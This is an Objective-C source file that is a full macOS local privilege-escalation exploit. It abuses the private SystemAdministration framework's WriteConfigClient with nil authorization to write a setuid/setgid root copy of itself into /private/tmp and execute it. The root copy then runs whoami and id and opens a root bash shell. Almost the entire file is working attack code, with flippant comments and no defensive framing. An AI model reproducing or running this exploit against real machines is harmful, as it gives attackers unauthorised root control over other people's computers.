#include <Foundation/Foundation.h>
#include <objc/runtime.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <unistd.h>
#include <libgen.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>

#define kSystemAdminFramework "/System/Library/PrivateFrameworks/SystemAdministration.framework/SystemAdministration"
#define kFilePrefix           "/private/tmp/"
#define kPOSIXPermissions     06777
#define kWaitTime             1500

// Use new prototype
extern void objc_msgSend(void);
typedef id (*msgsend_t)(id, SEL, ...);
static const msgsend_t objc_send = (msgsend_t)objc_msgSend;

int main(int argc, char *const *argv, char *const *environ)
{
    if (!geteuid()) {
        // I can haz root?
        setuid(geteuid());

        if (!getegid())
        {
            // Ooh, wheel too
            setgid(getegid());
        }

        NSLog(@"Injected program running at %s [euid: %d, egid: %d]", argv[0], getuid(), getgid());
        printf("whoami: "); fflush(stdout); system("whoami");
        printf("id: "); fflush(stdout); system("id");
        system("bash");
        exit(0);
    } else {
        void *handle = dlopen(kSystemAdminFramework, RTLD_NOW);
        if (!handle) NSLog(@"Error Loading %s!", kSystemAdminFramework);

        NSData *data = [[NSData alloc] initWithContentsOfFile:[NSString stringWithUTF8String:argv[0]]];
        NSString *path = [NSString stringWithFormat:@"%s%s", kFilePrefix, basename(argv[0])];
        NSLog(@"Injecting %s to %@ with setuid and setgid enabled [POSIX Permissions = %o]", argv[0], path, kPOSIXPermissions);

        //id auth = objc_send(objc_lookUpClass("SFAuthorization"), sel_registerName("authorization"));
        id sharedClient = objc_send(objc_lookUpClass("WriteConfigClient"), sel_registerName("sharedClient"));
        objc_send(sharedClient, sel_registerName("authenticateUsingAuthorizationSync:"), nil);
        id tool = objc_send(sharedClient, sel_registerName("remoteProxy"));
        objc_send(tool, sel_registerName("createFileWithContents:path:attributes:"), data, path, @{NSFilePosixPermissions : @kPOSIXPermissions});
        char fdloc[PATH_MAX];
        int fd = -1;

        while ((fd = open([path UTF8String], O_RDONLY)) == -1)
        {
            // A: It's still copying
            // B: Do something...
            // A: what should I do?
            // B: idgaf, but do *something*
            // A: fine.
            ;
            // A: happy?
            // B: well not really, that's just a nop
            // A: w/e xpc should learn to copy faster
            // B: *sigh* ugh.. fine.
            // A: thank you.
            // *both exit*
        }

        if (fcntl(fd, F_GETPATH, fdloc) == -1)
        {
            perror("fcntl");
            exit(1);
        }

        int iopipe[2];
        pid_t child;
        close(fd);

        if (pipe(iopipe) == -1)
        {
            perror("pipe");
            exit(1);
        }

        if ((child = fork()) == -1)
        {
            perror("fork");
            exit(1);
        }

        switch (child)
        {
            case 0: {
                // I AM the child, doofus
                if (close(iopipe[0]) == -1)
                {
                    perror("close");
                    exit(1);
                }

                if (dup2(STDIN_FILENO, iopipe[1]) == -1)
                {
                    perror("dup2");
                    exit(1);
                }

                if (close(iopipe[1]) == -1)
                {
                    perror("close");
                    exit(1);
                }

                NSLog(@"Executing %@ in %d microseconds...", path, kWaitTime); usleep(kWaitTime);
                execve([path UTF8String], (char *const [2]){(char *)[path UTF8String], NULL}, environ);

                // If I'm here, we dun fukd up
                perror("execve");
                exit(1);
            } break;
            default: {
                // I'm the parent :3
                if (close(iopipe[1]) == -1)
                {
                    perror("close");
                    exit(1);
                }

                FILE *cstream = fdopen(iopipe[0], "r");
                if (!cstream) exit(2);

                char *line = NULL;
                ssize_t read = 0;

                while (!feof(cstream) && !(read = getline(&line, NULL, cstream)))
                {
                    fprintf(stdout, "child: %s[%u]: %s\n", basename(argv[0]), child, line);
                    free(line);
                }

                fclose(cstream);
                pid_t waitproc = 0;

                while ((waitproc = wait3(NULL, WNOHANG, NULL)) != child)
                {
                    if (waitproc == 0 || (waitproc == -1 && errno == ECHILD)) {
                        // Child is dead.
                        exit(0);
                    } else {
                        perror("wait3");
                        kill(child, SIGKILL);
                    }
                }

                exit(0);
            } break;
        }
    }

    return(0);
}
